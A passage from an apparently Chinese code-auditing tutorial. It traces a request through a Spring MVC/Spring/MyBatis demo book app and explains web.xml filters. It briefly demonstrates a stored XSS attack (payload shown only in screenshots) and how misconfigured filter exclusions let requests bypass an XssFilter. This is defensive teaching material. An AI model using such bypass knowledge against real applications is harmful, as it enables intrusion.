MVC、Hibernate和MyBatis等。目前很多成熟的大型项目在开发过程中都使用这些开源框架，而框架的本质是对底层信息的进一步封装，目的是使开发人员将更多的精力集中在业务逻辑中。针对框架的审计则需要我们对框架本身的执行流程有一定程度的了解，根据框架的执行流程逐步追踪，从而发现隐藏在项目代码中的种种安全隐患。</p><h2 id="7-1-开发框架审计技巧简介"><a href="#7-1-开发框架审计技巧简介" class="headerlink" title="7.1　开发框架审计技巧简介"></a>7.1　开发框架审计技巧简介</h2><h3 id="7-1-1-SSM框架审计技巧"><a href="#7-1-1-SSM框架审计技巧" class="headerlink" title="7.1.1　SSM框架审计技巧"></a>7.1.1　SSM框架审计技巧</h3><h4 id="1．SSM框架简介"><a href="#1．SSM框架简介" class="headerlink" title="1．SSM框架简介"></a>1．SSM框架简介</h4><p>SSM框架，即Spring MVC+Spring+MyBatis这3个开源框架整合在一起的缩写。在SSM框架之前，生产环境中多采用SSH框架（由Struts2+Spring+Hibernate这3个开源框架整合而成）。后因Struts2爆出众多高危漏洞，导致目前SSM逐渐代替SSH成为主流开发框架的选择。</p><p>审计SSM框架时，首先需要对Spring MVC设计模式和Web三层架构有一定程度的了解，篇幅所限这里只进行简单介绍。</p><h5 id="（1）Spring-MVC。"><a href="#（1）Spring-MVC。" class="headerlink" title="（1）Spring MVC。"></a>（1）Spring MVC。</h5><p>Spring MVC是一种基于Java实现的MVC设计模式的请求驱动类型的轻量级Web框架，采用MVC架构模式的思想，将Web层进行职责解耦。基于请求驱动指的是使用请求-响应模型，该框架的目的是简化开发过程。</p><h5 id="（2）Spring。"><a href="#（2）Spring。" class="headerlink" title="（2）Spring。"></a>（2）Spring。</h5><p>Spring是分层的 Java SE&#x2F;EE full-stack 轻量级开源框架，以IoC（Inverse of Control，控制反转）和 AOP（Aspect OrientedProgramming，面向切面编程）为内核，使用基本的 JavaBean 完成以前只可能由 EJB 完成的工作，取代了 EJB 臃肿和低效的开发模式。Spring的用途不仅仅限于服务器端的开发。从简单性、可测试性和松耦合性角度而言，绝大部分Java应用可以从Spring中受益。</p><h5 id="（3）MyBatis。"><a href="#（3）MyBatis。" class="headerlink" title="（3）MyBatis。"></a>（3）MyBatis。</h5><p>MyBatis是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJO（Plain Old Java Object，普通的 Java对象）映射成数据库中的记录。</p><h5 id="（4）Servlet。"><a href="#（4）Servlet。" class="headerlink" title="（4）Servlet。"></a>（4）Servlet。</h5><p>Spring MVC的底层就是以Servlet技术进行构建的。Servlet是基于Java技术的Web组件，由容器管理并产生动态的内容。Servlet与客户端通过Servlet容器实现的请求&#x2F;响应模型进行交互。</p><p>对以SSM框架搭建的Java Web项目进行审计，需要对以上概念有一定程度的了解。</p><h4 id="2．SSM框架代码的执行流程和审计思路"><a href="#2．SSM框架代码的执行流程和审计思路" class="headerlink" title="2．SSM框架代码的执行流程和审计思路"></a>2．SSM框架代码的执行流程和审计思路</h4><p>代码审计的核心思想是追踪参数，而追踪参数的步骤就是程序执行的步骤。因此，代码审计是一个跟踪程序执行步骤的过程，了解了SSM框架的执行流程自然会了解如何如跟踪一个参数，剩下的就是观察在参数传递的过程中有没有一些常见的漏洞点。</p><p>这里通过创建一个简单的Demo来描述基于SSM框架搭建的项目完成用户请求的具体流程，以及观察程序对参数的过滤是如何处理的。图7-1展示了一个简单的图书管理程序的目录结构，主要功能是对图书名称的增、删、查、改。。。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301317742.png" alt="image-20220430131759191"></p><p>图7-1　图书管理程序的目录结构</p><p>无论是审计一个普通项目或者是Tomcat所加载的项目，通常都从web.xml配置文件开始入手。Servlet 3.0以上版本提供一些新注解来达到与配置web.xml相同的效果。但是在实际项目中主流的配置方法仍然是web.xml。</p><p>src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml</p><p>web.xml文件的主要工作包括以下几个部分。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">web.xml启动Spring容器。<br>DispathcherServlet的声明。<br>其余工作是<span class="hljs-keyword">session</span>过期、字符串编码等。<br></code></pre></td></tr></table></figure><p>首先是生成DispatcherServlet类。DispatcherServlet是前端控制器设计模式的实现，提供Spring Web MVC的集中访问点（也就是把前端请求分发到目标Controller），而且与Spring IoC容器无缝集成，从而可以利用Spring的所有优点。</p><p>简单地理解就是，将用户的请求转发至Spring MVC中，交由SpringMVC的Controller进行更多处理。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011328353.png" alt="image-20220501132825638"></p><p><init-param>子标签是生成DispatcherServlet时的初始化参数contextConfigLocation，Spring会根据该参数加载所有逗号分隔的xml文件。如果没有这个参数，Spring默认加载WEB-INF&#x2F;DispatcherServlet-servlet.xml文件。</p><p>如图7-2所示，<servlet-mapping>标签中还有一个子标签<url-pattern>，其中value是“&#x2F;”代表拦截所有请求。图7-2中还包含<filter>标签，具体功能会在后面进行介绍。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011330712.png" alt="image-20220501133016607"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301322856.png" alt="image-20220430132223706"></p><p>图7-2　web.xml文件内容</p><h4 id="3．Spring核心配置文件applicationContext-xml"><a href="#3．Spring核心配置文件applicationContext-xml" class="headerlink" title="3．Spring核心配置文件applicationContext.xml"></a>3．Spring核心配置文件applicationContext.xml</h4><p>我们可以根据加载顺序查看applicationContext.xml，如图7-3所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301324405.png" alt="image-20220430132449250"></p><p>图7-3　applicationContext.xml</p><p>applicationContext.xml中包含3个配置文件，它们是Spring用来整合Spring MVC和MyBaits的配置文件，文件中的内容都可以直接写入applicationContext.xml中，因为applicationContext.xml是Spring的核心配置文件，例如生成Bean，配置连接池，生成sqlSessionFactory。但是为了便于理解，这些配置分别写在3个配置文件中，由applicationContext.xml将3个xml进行关联。由图7-4我们可以清晰地看到applicationContext.xml将这3个配置文件关联了起来。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301328221.png" alt="image-20220430132851296"></p><p>图7-4　applicationContext.xml关联3个配置文件</p><p>数据经由DispatcherServlet派发至Spring-mvc.xml的Controller层。我们先看Spring-mvc.xml配置文件，如图7-5所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301331439.png" alt="image-20220430133142253"></p><p>图7-5　Spring-mvc.xml配置文件</p><h5 id="（1）-lt-mvc-annotation-driven-x2F-gt-标签。"><a href="#（1）-lt-mvc-annotation-driven-x2F-gt-标签。" class="headerlink" title="（1）&lt;mvc:annotation-driven &#x2F;&gt;标签。"></a>（1）&lt;mvc:annotation-driven &#x2F;&gt;标签。</h5><p>如果在web.xml中servlet-mapping的url-pattern设置的是&#x2F;，而不是.do，表示将所有的文件包含静态资源文件都交给Spring MVC处理，这时需要用到&lt;mvc:annotation-driven &#x2F;&gt;。如果不加，则DispatcherServlet无法区分请求是资源文件还是MVC的注解，而导致Controller的请求报404错误。</p><h5 id="（2）mvc-default-servlet-handler-标签。"><a href="#（2）mvc-default-servlet-handler-标签。" class="headerlink" title="（2）mvc:default-servlet-handler/标签。"></a>（2）<a href="mvc:default-servlet-handler/">mvc:default-servlet-handler/</a>标签。</h5><p>在Spring-mvc.xml中配置<a href="mvc:default-servlet-handler/">mvc:default-servlet-handler/</a>后，会在Spring MVC上下文中定义一个org.springframework.web.servlet.resource.DefaultServletHttp-RequestHandler，它会像检查员一样对进入DispatcherServlet的URL进行筛查。如果是静态资源的请求，就将该请求转由Web应用服务器默认的Servlet处理；如果不是静态资源的请求，则交由DispatcherServlet继续处理。</p><p>其余两项之一是指定了返回的view所在的路径，另一个是指定SpringMVC注解的扫描路径，可以发现该配置文件中都是与Spring-mvc相关的配置。</p><h4 id="4．SSM之Spring-MVC执行流程"><a href="#4．SSM之Spring-MVC执行流程" class="headerlink" title="4．SSM之Spring MVC执行流程"></a>4．SSM之Spring MVC执行流程</h4><p>接下来就是Spring MVC Controller层接受前台传入的数据。以下通过DEMO运行以方便演示和讲解，首页如图7-6所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301524569.png" alt="image-20220430152404441"></p><p>图7-6　首页</p><p>查看首页的页面源码，如图7-7所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301525055.png" alt="image-20220430152457937"></p><p>图7-7　首页的页面源码</p><p>可以看到a标签的超链接是<a href="http://localhost:8080/SSMFrameWorkTest_war/">http://localhost:8080/SSMFrameWorkTest_war/</a> book&#x2F;allbook。</p><p>${pageContext.request.contextPath}是JSP取得绝对路径的方法, 也就是取出部署的应用程序名或者是当前的项目名称，避免在把项目部署到生产环境中时出错。</p><p>此时后台收到的请求路径为&#x2F;book&#x2F;allBook。Spring MVC在项目启动时会首先去扫描我们指定的路径，即&#x3D;&#x3D;com.ssm_project.controller&#x3D;&#x3D;路径下的所有类。BookController类的代码如图7-8所示。</p><p>Spring MVC会扫描该类中的所有注解，看到@Controller时会生成该Controller的Bean，扫描到@RequestMappting注解时会将@RequestMappting中的URI与下面的方法形成映射。所以我们请求的URI是“&#x2F;book&#x2F;allBool”，Spring MVC会将数据交由BookController类的list方法来处理。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301530904.png" alt="image-20220430153005712"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301530186.png" alt="image-20220430153029994"></p><p>图7-8　BookController类的代码</p><p>仔细观察list方法，其中调用了bookService参数的queryAllBook方法，这里使用了两个注解：@Autowired和@Qualifier。这两个注解的作用简单介绍如下。</p><h5 id="（1）-Autowired。"><a href="#（1）-Autowired。" class="headerlink" title="（1）@Autowired。"></a>（1）@Autowired。</h5><p>此注解的作用：自动按照类型注入,只要有唯一的类型匹配就能注入成功，传入的类型不唯一时则会报错。</p><h5 id="（2）-Qualifier。"><a href="#（2）-Qualifier。" class="headerlink" title="（2）@Qualifier。"></a>（2）@Qualifier。</h5><p>该注解的作用：在自动按照类型注入的基础上，再按照bean的id注入。它在给类成员注入数据时不能独立使用；但是在给方法的形参注入数据的时候，可以独立使用。</p><p>由此可以看到bookService参数的类型是BookService类型，通过注解自动注入的Bean的id叫作BookServiceImpl。</p><h4 id="5．SSM之Spring执行流程"><a href="#5．SSM之Spring执行流程" class="headerlink" title="5．SSM之Spring执行流程"></a>5．SSM之Spring执行流程</h4><p>这里我们就要从Spring MVC的部分过渡到Spring的部分，&#x3D;&#x3D;所谓的过渡就是我们从Spring MVC的Controller层去调用Service层，而Service层就是我们使用Spring进行IoC控制和AOP编程的地方。&#x3D;&#x3D;</p><p>首先我们需要查看配置文件spring-service.xml，如图7-9所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301549863.png" alt="image-20220430154949690"></p><p>图7-9　配置文件spring-service.xml</p><p>这里我们发现id为&#x3D;&#x3D;BookServiceImpl的bean&#x3D;&#x3D;，该bean的class路径是com.ssm_project.service.BookServiceImpl。<bean>这个标签涉及Spring一大核心功能点，即IoC。本来编写一个项目需要我们自己手动去创建一个实例，在使用了Spring以后只需要生成的那个类的绝对路径，以及创建一个实例时需要传入的参数。传入参数的方法可以是通过构造方法，也可以通过set方法。用户还可以为这个bean设置一个名称方便调用（如果不设置id参数名，则bean的名称默认为类名开头的小写字母，比如BookServiceImpl，如不特别指定，则生成的bean的名称是bookServiceImpl）。Spring会在启动时将用户指定好的类生成的实例放入IoC容器中供用户使用。通俗地说就是本来由用户手动生成实例的过程交由Spring来处理，这就是所谓的控制反转。</p><p>接下来查看BookServiceImpl类的详细信息，如图7-10所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301550133.png" alt="image-20220430155010009"></p><p>图7-10　BookServiceImpl类的详细信息</p><p>首先看到该类实现了BookService接口，查看该接口，如图7-11所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301550642.png" alt="image-20220430155049464"></p><p>图7-11　BookService接口</p><p>可以看到该接口中定义了4种方法，为了方便理解，这些方法的名字对应着日常项目中常用的操作数据库的4个方法，即增、删、改、查。</p><p>接下来查看接口的实现类BookServiceImpl，如图7-12所示。</p><p>实现了BookService接口，自然也需要实现该接口下的所有方法，找到queryAllBook方法，发现&#x3D;&#x3D;queryAllBook&#x3D;&#x3D;调用了bookMapper参数的queryAllBook方法，而bookMapper是BookMapper类型的参数。</p><p>回过头来查看spring-service.xml中的配置。前面介绍了这一配置是将BookServiceImpl类生成一个bean并放入Spring 的IoC容器中。<property>标签的意思是通过该类提供的set方法在bean生成时向指定的参数注入value，name属性就是指定的参数的名称。可以看到BookServiceImpl中确实有一个私有参数，名为bookMapper，并且提供了该属性的set方法。ref属性是指要注入的value是其他的Bean类型，&#x3D;&#x3D;如果传入的是一些基本类型或者String类型，则不需要使用ref，只需将ref改成value&#x3D;&#x3D;，如图7-13所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204301606676.png" alt="image-20220430160602512"></p><p>图7-12　实现类BookServiceImpl</p><p>图7-13　spring-service.xml中的配置<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302152311.png" alt="image-20220430214019168"></p><p>这里通过ref属性向BookServiceImpl类中的bookMapper参数注入了一个value，这个value是一个其他的bean类型，该bean的id为bookMapper。此时Service层的BookServiceImpl的queryAllBook方法的实现方式其实就是调用了id为bookMapper的bean的queryAllBook方法，因此这个id为bookMapper的bean就是程序执行的下一步。</p><h4 id="6．SSM之MyBatis执行流程"><a href="#6．SSM之MyBatis执行流程" class="headerlink" title="6．SSM之MyBatis执行流程"></a>6．SSM之MyBatis执行流程</h4><p>接下来就是Web三层架构的数据访问层，也就是MyBaits负责的部分，通常这一部分的包名叫作xxxdao，也就是开发过程中经常提及的DAO层，该包下面的类和接口通常叫作xxxDao或者xxxMapper。此时用户的请求将从Spring负责的业务层过渡到MyBatis负责的数据层，但是MyBaits和Spring之间不像SpringMVC和Spring一样可以无缝衔接，所以我们需要通过配置文件将MyBatis与Spring关联起来。这里我们来查看一下pom.xml，如图7-14所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011338846.png" alt="image-20220501133846711"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302152469.png" alt="image-20220430215147483"></p><p>图7-14　pom.xml文件</p><p>可以看到我们导入的包除了MyBatis本身，还导入了一个mybatis-spring包，目的就是为了整合MyBatis和Spring。spring-dao.xml是用来整合Spring和MyBatis的配置文件。</p><p>刚才我们看到Spring启动加载bean时会注入一个id为bookMapper的bean，但是我们并未在之前的任何配置文件包括注解中看到这个bean的相关信息，所以我们接下来要查看spring-dao.xml中有没有与这个bean有关的信息，如图7-15所示。</p><p>图7-15　查看spring-dao.xml文件<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302156547.png" alt="image-20220430215501251"></p><p>图7-15　查看spring-dao.xml文件（续）</p><p>每项配置的作用基本都用注释的方式标明。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302154925.png" alt="image-20220430215408774" style="zoom:80%;" /></p><p>这里关联了一个&#x3D;&#x3D;properties&#x3D;&#x3D;文件，如图7-16所示，里面是连接数据库和配置连接池时需要的信息<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302154852.png" alt="image-20220430215435723"></p><p>图7-16　properties文件</p><p>重点查看这个配置，如图7-17所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302204256.png" alt="image-20220430215823482"></p><p>图7-17　配置扫描DAO接口包</p><p>该配置通过生成MapperScannerConfigurer的bean来实现自动扫描com.ssm_project.dao下面的接口包，然后&#x3D;&#x3D;动态注入Spring IoC容器中&#x3D;&#x3D;，同样动态注入的bean的id默认为类名（开头字母小写），目录下包含的文件如图7-18所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204302204911.png" alt="image-20220430220440789"></p><p>我们看到有一个叫作BookMapper的接口文件，说明之前生成BookServiceImpl这个bean是通过<property>（BookServiceImpl类中的setBookMapper()方法）注入的bookMapper，是由我们配置了MapperScannerConfigurer这个bean后，这个bean扫描dao包下的接口文件并生成bean。然后再注入Spring的IoC容器中，所以我们才可以在BookServiceImpl这个bean中通过<property>标签注入bookmapper这个bean。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011341890.png" alt="image-20220501134040893"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011345455.png" alt="image-20220501134527299"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011343347.png" alt="image-20220501134324227"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011343134.png" alt="image-20220501134334959"></p><p>这里生成一个id为SqlSessionFactory的bean，涉及MyBatis中的两个关键对象即SqlSessionFactory和SqlSession。</p><p>两个对象简单介绍如下。</p><h6 id="（1）SqlSessionFactory。"><a href="#（1）SqlSessionFactory。" class="headerlink" title="（1）SqlSessionFactory。"></a>（1）SqlSessionFactory。</h6><p>SqlSessionFactory是MyBatis的关键对象，它是单个数据库映射关系经过编译后的内存镜像。SqlSessionFactory对象的实例可以通过SqlSessionBuilder对象获得，而SqlSessionBuilder则可以从xml配置文件或一个预先定制的Configuration的实例构建出SqlSessionFactory的实例。SqlSessionFactory是创建SqlSession的工厂。</p><h6 id="（2）SqlSession。"><a href="#（2）SqlSession。" class="headerlink" title="（2）SqlSession。"></a>（2）SqlSession。</h6><p>SqlSession是执行持久化操作的对象，类似于JDBC中的Connection。它是应用程序与持久存储层之间执行交互操作的一个单线程对象。SqlSession对象完全包括以数据库为背景的所有执行SQL操作的方法，它的底层封装了JDBC连接，可以用SqlSession实例来直接执行已映射的SQL语句。</p><p>SqlSessionFactory和SqlSession的实现过程如下。</p><p>MyBatis框架主要是围绕着SqlSessionFactory进行的，实现过程大概如下。</p><p>定义一个Configuration对象，其中包含数据源、事务、mapper文件资源以及影响数据库行为属性设置settings。</p><p>通过配置对象，则可以创建一个SqlSessionFactoryBuilder对象。</p><p>通过 SqlSessionFactoryBuilder 获得SqlSessionFactory 的实例。</p><p>SqlSessionFactory 的实例可以获得操作数据的SqlSession实例，通过这个实例对数据库进行。</p><p>如果是Spring和MyBaits整合之后的配置文件，一般以这种方式实现SqlSessionFactory的创建，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011357070.png" alt="image-20220501135705954"></p><p>SqlSessionFactoryBean是一个工厂Bean，根据配置来创建SqlSessionFactory。</p><p>手动创建SqlSessionFactory和SqlSession的流程如图7-20所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">读取mybatis配置文件<br>getresourceasstream(<span class="hljs-string">&quot;xxx.xml&quot;</span>)<br>builder<br>factory<br>session<br>dao<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011359829.png" alt="image-20220501135912683"></p><p>图7-20　手动创建SqlSessionFactory和SqlSession的流程</p><p>我们同时注意到<property>标签的value属性是“classpath:mybatis-config.xml”，如图7-21所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011401379.png" alt="image-20220501140116247"></p><p>图7-21　<property>标签的value属性</p><p>这里又引入了一个xml配置文件，即mybatis-config.xml，是MyBatis的配置文件。</p><p>程序刚才执行到BookServiceImpl类的queryAllBook方法，然后该方法又调用了bookMapper的queryAllBook方法。我们发现bookMapper的类型是BookMapper，并且从sping-dao.xml的配置文件中看到了该文件位于com.ssm_project.dao路径下。现在打开BookMapper.java文件进行查看，如图7-22所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011405029.png" alt="image-20220501140442957"></p><p>图7-22　查看BookMapper.java文件</p><p>我们注意到这只是一个接口，众所周知，接口不能进行实例化，只是提供一个规范，因此这里的问题是调用的BookMapper的queryAllBook是怎样执行的？</p><p>仔细查看dao目录下的文件，如图7-23所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011405256.png" alt="image-20220501140549153"></p><p>图7-23　dao目录下的文件</p><p>其中有一个名称与BookMapper.java名称相同的xml文件，其内容如图7-24所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011410485.png" alt="image-20220501140941935"></p><p>图7-24　查看xml文件的内容</p><p>看到这个文件，虽然我们对MyBatis的了解并不多，但是可以大概了解&#x3D;&#x3D;为什么&#x3D;&#x3D;BookMapper明明只是接口，我们却可以实例化生成BookMapper的bean，并且可以调用它的方法。</p><p>但是BookMapper.java和BookMapper.xml显然不是MyBatis的全部，两个文件之间此时除了名字相同以外还没有什么直接联系，所以我们还需要将它们关联起来。查看mybatis-config.xml的配置文件，如图7-25所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011411685.png" alt="image-20220501141109558"></p><p>可以发现<mappers>标签的resource属性的value就是BookMapper.xml的路径MyBatis，是&#x3D;&#x3D;基于SQL映射配置的框架。SQL语句都写在 Mapper 配置文件中&#x3D;&#x3D;，构建 SqlSession 类后，需要去读取 Mapper 配置文件中的SQL配置。&#x3D;&#x3D;而<mappers> 标签就是用来配置需要加载的 SQL映射配置文件路径的&#x3D;&#x3D;。</p><p>也就是说，&#x3D;&#x3D;最终由Spring生成BookMapper的代理对象，然后由MyBaits通过<mappers>标签将BookMapper代理对象中的方法与BookMapper.xml中的配置进行一一映射&#x3D;&#x3D;，并最终执行其中的SQL语句。</p><p>可以发现此次请求最终调用了BookMapper的queryAllBook方法，这时我们需要去BookMapper.xml中寻找与之对应的SQL语句，如图7-26所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011414174.png" alt="image-20220501141427399"></p><p>图7-26　寻找与之对应的SQL语句</p><p>我们看到最后执行的SQL语句如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011415994.png" alt="image-20220501141535889"></p><p>至此我们的请求已经完成，&#x3D;&#x3D;从一开始的由DispatcherServlet前端控制器派发给Spring MVC，并最终通过MyBatis 执行我们需要对数据库进行的操作。&#x3D;&#x3D;</p><p>生产环境的业务代码肯定会比这个DEMO复杂，但是整体的执行流程和思路并不会有太大的变化，所以审计思路也是如此。</p><p>SSM框架有3种配置方式，即全局采用&#x3D;&#x3D;xml配置文件&#x3D;&#x3D;的形式，全局采取注解的配置方式，或者&#x3D;&#x3D;注解与xml配置文件&#x3D;&#x3D;配合使用的方式，区别只是在于写法不同，执行流程不会因此发生太多改变</p><h4 id="7．审计的重点——filter过滤器"><a href="#7．审计的重点——filter过滤器" class="headerlink" title="7．审计的重点——filter过滤器"></a>7．审计的重点——filter过滤器</h4><p>下面介绍web.xml的<filter>标签。</p><p>Spring MVC是构建于Servlet之上的，所以Servlet中的过滤器自然也可以使用，只不过不能配置在spring-mvc.xml中，而是要直接配置在web.xml中，因为它是属于Servlet的技术。</p><p>重新查看web.xml文件，如图7-27所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011424176.png" alt="image-20220501142433033"></p><p>图7-27　重新查看web.xml文件</p><p>首先，此时程序是没有XSS防护的，所以存在存储型XSS漏洞，我们来尝试存储型XSS攻击，如图7-28所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011426856.png" alt="image-20220501142647749"></p><p>单击新增功能，如图7-29所示。<img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220501142700732.png" alt="image-20220501142700732"></p><p>图7-29　新增功能</p><p>查看提交路径，如图7-30所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011430672.png" alt="image-20220501143022559"></p><p>图7-30　查看提交路径</p><p>去后台寻找与之对应的方法，如图7-31所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011432897.png" alt="image-20220501143259762"></p><p>图7-31　寻找与之对应的方法</p><p>找到后在这里设置断点，查看&#x3D;&#x3D;传入参数&#x3D;&#x3D;的详细信息，如图7-32所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011435679.png" alt="image-20220501143542570"></p><p>图7-32　设置断点</p><p>XSS语句在未经任何过滤直接传入，如图7-33所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011436856.png" alt="image-20220501143658740"></p><p>图7-33　直接传入XSS语句</p><p>此时可以在web.xml中配置<filter>防御XSS攻击，如图7-34所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011437126.png" alt="image-20220501143716004"></p><p>图7-34　配置<filter>防御XSS攻击</p><p>这里声明了com.ssm_project.filter的包路径下又一个类XssFilter，它是一个过滤器。</p><p>下面的&#x3D;&#x3D;<dispatcher>属性中的REQUEST&#x3D;&#x3D;的意思是只要发起的操作是一次HTTP请求，比如请求某个URL、发起一个GET请求、表单提交方式为POST的POST请求、表单提交方式为GET的GET请求。一次重定向则相当于前后发起了两次请求，这些情况下有几次请求就会经过几次指定过滤器。</p><p><dispatcher>属性2.4版本的Servlet中添加的新的属性标签总共有4个值，分别是&#x3D;&#x3D;REQUEST、FORWARD、INCLUDE和ERROR&#x3D;&#x3D;，以下对这4个值进行简单说明。</p><h5 id="（1）REQUEST。"><a href="#（1）REQUEST。" class="headerlink" title="（1）REQUEST。"></a>（1）REQUEST。</h5><p>只要发起的操作是一次HTTP请求，比如请求某个URL、发起一个GET请求、表单提交方式为POST的POST请求、表单提交方式为GET的GET请求，就会经过指定的过滤器。</p><h5 id="（2）FORWARD。"><a href="#（2）FORWARD。" class="headerlink" title="（2）FORWARD。"></a>（2）FORWARD。</h5><p>只有当当前页面是通过&#x3D;&#x3D;请求转发&#x3D;&#x3D;过来的情形时，才会经过指定的过滤器。</p><h5 id="（3）INCLUDE。"><a href="#（3）INCLUDE。" class="headerlink" title="（3）INCLUDE。"></a>（3）INCLUDE。</h5><p>只要是通过&lt;jsp:include page&#x3D;”xxx.jsp” &#x2F;&gt;嵌入的页面，每嵌入一个页面都会经过一次指定的过滤器</p><h5 id="（4）ERROR。"><a href="#（4）ERROR。" class="headerlink" title="（4）ERROR。"></a>（4）ERROR。</h5><p>假如web.xml中配置了<error-page></error-page>，如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011445524.png" alt="image-20220501144544211"></p><p>意思是HTTP请求响应的状态码只要是400、404、500这3种状态码之一，容器就会将请求转发到error.jsp下，这就触发了一次error，经过配置的DispatchFilter。&#x3D;&#x3D;需要注意的是&#x3D;&#x3D;，虽然把请求转发到error.jsp是一次forward的过程，但是配置成<dispatcher>FORWARD</dispatcher>并不会经过DispatchFilter过滤器。</p><p>这4种dispatcher方式可以单独使用，也可以组合使用，只需配置多个<dispatcher> </dispatcher>即可。</p><p>审计时的过滤器<dispatcher>属性中使用的值也是我们关注的一个点。<url-pattern>属性会指明我们要过滤访问哪些资源的请求，&#x3D;&#x3D;“&#x2F;*”的意思是拦截所有对后台的请求&#x3D;&#x3D;, 包括一个简单的对JSP页面的GET请求。同时我们可以具体地指定拦截对某一资源的请求，同时也可以设置对某些资源的请求不进行过滤而单独放过。</p><p>示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011447739.png" alt="image-20220501144712632"></p><p>既然能够指定单独过滤特定资源，自然也就可以指定放行特定资源。</p><p>设置对全局资源请求过滤肯定是不合理的。生产环境中有很多静态资源不需要进行过滤，所以我们可以指定将这些资源进行放行，示例代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011450315.png" alt="image-20220501145017108"></p><p>这样配置后，如果有对 html、js 和ico资源发起的请求，Serlvet在路径选择时就不会将该请求转发至XssFilter类。</p><p>在审计代码时，这也是需要注意的一个点，因&#x3D;&#x3D;为开发人员的错误配置有可能导致本应该经过过滤器的请求却被直接放行，从而使项目中的过滤器失效。&#x3D;&#x3D;</p><p>了解<filter>标签的作用后，查看XssFilter类的内容，如图7-35所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011452586.png" alt="image-20220501145219749"></p><p>图7-35　filter包的内容</p><p>可以看到filter包下有两个Java类，先来查看XssFilter类，如图7-36所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011751841.png" alt="image-20220501175108696"></p><p>图7-36　查看XssFilter类</p><p>图7-36　查看XssFilter类</p><p>@Override    – @Override 只能标注方法，表示该方法覆盖父类中的方法。</p><p>查看Filter接口的源码，如图7-37所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011752594.png" alt="image-20220501175234826"></p><p>可以看到Filter所属的包是javax.servlet。</p><p>Filter是Servlet的三大组件之一，javax.servlet.Filter 